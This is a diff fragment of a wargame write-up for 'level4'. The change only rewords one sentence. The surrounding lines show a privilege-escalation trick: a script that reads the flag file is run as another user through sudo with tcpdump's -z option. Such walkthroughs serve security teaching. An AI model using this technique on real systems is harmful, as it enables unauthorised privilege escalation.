@@ -163,7 +163,7 @@ If we could find a way `tcpdump` to execute a command or a script, it will be do
 level4@harmonie-technologie:~$ echo "cat /wargames/level4/validation/flag" > /tmp/script.sh
 level4@harmonie-technologie:~$ chmod +x /tmp/script.sh
 ```
-Then we found [here] cool `tcpdump` options. Let's use this to execute our `script.sh` !
+Then, let's do crazy things with `tcpdump` options to execute our `script.sh` !
 ```bash
 level4@harmonie-technologie:~$ sudo -u level4_OK /usr/sbin/tcpdump -ln -i ens32 -w /dev/null -W 1 -G 1 -z /tmp/script.sh
 tcpdump: listening on ens32, link-type EN10MB (Ethernet), capture size 262144 bytes
